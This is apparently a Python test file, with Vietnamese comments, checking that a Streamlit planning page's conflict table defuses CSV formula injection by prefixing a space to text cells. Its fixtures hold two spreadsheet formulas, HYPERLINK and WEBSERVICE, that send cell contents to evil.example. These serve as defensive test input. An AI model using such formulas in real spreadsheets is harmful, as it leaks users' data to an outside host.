"""T-102 lượt 2 (Chỉ Huy B giao 30/10 19:52): LC-T101-1 của Lá Chắn T-101 cho mọi bảng có chữ từ
Sheet, AI, website ở trang Kế hoạch (bảng danh sách bài và đề xuất có test ở
``tests/test_la_chan_t101.py``; ở đây: bảng xung đột khi «Áp dụng»).

Bảng ``st.dataframe`` có nút «Tải về CSV» của Streamlit: ô mở đầu bằng ``=``, ``+``, ``-``, ``@``,
tab, CR tải về mở bằng Excel thành công thức. Ô chữ phải qua ``sync.safe_text`` (thêm một dấu cách
đầu). Bảng xác nhận và bảng liên kết nội bộ của trang Soạn bài: ``tests/test_t102_publish.py``.

Không gọi Google, WordPress, AI thật: dùng lại bộ giả của ``tests/test_t101_plan_page.py``.
"""

from __future__ import annotations

import test_t101_plan_page as plan_page
from fake_plan_sheet import HEADER

env = plan_page.env
caches = plan_page.caches
private_key = plan_page.private_key
google = plan_page.google
sheet = plan_page.sheet

FORMULA_START = ("=", "+", "-", "@", "\t", "\r")
PASTED_TITLE = '=HYPERLINK("https://evil.example/?q="&A2;"Bấm") cửa cuốn'
SHEET_TITLE = '=WEBSERVICE("https://evil.example/?q="&B3) tiêu đề'


def text_cells(table) -> list[str]:
    return [value for column in table.columns for value in table[column] if isinstance(value, str)]


def test_conflict_table_cells_cannot_become_excel_formulas(project_root, sheet):
    """Đề xuất đổi «Tiêu đề dự kiến» mà máy kia vừa sửa ô đó: bảng «trước / bây giờ / đề xuất» có
    chữ Sheet và chữ dán dạng công thức, mọi ô chữ đều thêm một dấu cách đầu; không ghi gì."""
    at = plan_page.open_plan(project_root)
    plan_page.paste(
        at, f"Mã bài\tTừ khóa chính\tTiêu đề dự kiến\nB-001\tsửa cửa cuốn kêu to\t{PASTED_TITLE}\n"
    )
    round_ = at.session_state["plan_round"]
    box = at.checkbox(key=f"plan-pick-{round_}-1")
    if not box.value:  # đề xuất có chữ dạng công thức: có thể không tick sẵn
        box.check().run()
    sheet.set(2, HEADER.index("Tiêu đề dự kiến"), SHEET_TITLE)  # máy kia vừa sửa
    plan_page.click(at, "plan-apply")
    assert sheet.updates == []
    table = plan_page.frame(at, "Bây giờ trên Sheet")
    assert list(table["Bây giờ trên Sheet"]) == [" " + SHEET_TITLE]
    assert list(table["Đề xuất"]) == [" " + PASTED_TITLE]
    assert not any(value.startswith(FORMULA_START) for value in text_cells(table))
